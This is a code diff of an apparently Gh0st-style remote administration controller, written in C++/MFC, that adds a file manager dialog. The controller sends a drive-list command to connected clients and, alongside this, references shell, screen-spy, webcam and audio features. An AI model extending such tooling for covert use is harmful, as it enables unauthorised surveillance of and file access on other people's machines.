@@ -11,6 +11,7 @@
 #include "ShellDlg.h"
 #include "SystemDlg.h"
 #include "ScreenSpyDlg.h"
+#include "FileManagerDlg.h"
 
 #ifdef _DEBUG
 #define new DEBUG_NEW
@@ -132,6 +133,7 @@ BEGIN_MESSAGE_MAP(CPCRemoteDlg, CDialogEx)
 	ON_MESSAGE(WM_OPENSHELLDIALOG, OnOpenShellDialog)
 	ON_MESSAGE(WM_OPENPSLISTDIALOG, OnOpenSystemDialog)
 	ON_MESSAGE(WM_OPENSCREENSPYDIALOG, OnOpenScreenSpyDialog)
+	ON_MESSAGE(WM_OPENMANAGERDIALOG, OnOpenManagerDialog)
 
 	ON_COMMAND(IDM_NOTIFY_CLOSE, &CPCRemoteDlg::OnNotifyClose)
 	ON_COMMAND(IDM_NOTIFY_SHOW, &CPCRemoteDlg::OnNotifyShow)
@@ -235,11 +237,11 @@ void CPCRemoteDlg::ProcessReceiveComplete(ClientContext *pContext)
 		}
 
 		break;
-	/*case TOKEN_DRIVE_LIST: // 驱动器列表
+	case TOKEN_DRIVE_LIST: // 驱动器列表
 		// 指接调用public函数非模态对话框会失去反应， 不知道怎么回事,太菜
-		g_pConnectView->PostMessage(WM_OPENMANAGERDIALOG, 0, (LPARAM)pContext);
+		g_pPCRemoteDlg->PostMessage(WM_OPENMANAGERDIALOG, 0, (LPARAM)pContext);
 		break;
-	case TOKEN_WEBCAM_BITMAPINFO: // 摄像头
+	/*case TOKEN_WEBCAM_BITMAPINFO: // 摄像头
 		g_pConnectView->PostMessage(WM_OPENWEBCAMDIALOG, 0, (LPARAM)pContext);
 		break;
 	case TOKEN_AUDIO_START: // 语音
@@ -662,9 +664,27 @@ LRESULT CPCRemoteDlg::OnOpenScreenSpyDialog(WPARAM wParam, LPARAM lParam)
 void CPCRemoteDlg::OnOnlineFile()
 {
 	// TODO: 在此添加命令处理程序代码
-	MessageBox("文件管理");
+	//MessageBox("文件管理");
+	BYTE	bToken = COMMAND_LIST_DRIVE;            
+	SendSelectCommand(&bToken, sizeof(BYTE));
 }
 
+LRESULT CPCRemoteDlg::OnOpenManagerDialog(WPARAM wParam, LPARAM lParam)
+{
+
+	ClientContext *pContext = (ClientContext *)lParam;
+
+	//转到CFileManagerDlg  构造函数
+	CFileManagerDlg	*dlg = new CFileManagerDlg(this, m_iocpServer, pContext);
+	// 设置父窗口为卓面
+	dlg->Create(IDD_FILE, GetDesktopWindow());
+	dlg->ShowWindow(SW_SHOW);
+
+	pContext->m_Dialog[0] = FILEMANAGER_DLG;
+	pContext->m_Dialog[1] = (int)dlg;
+
+	return 0;
+}
 
 void CPCRemoteDlg::OnOnlineProcess()
 {
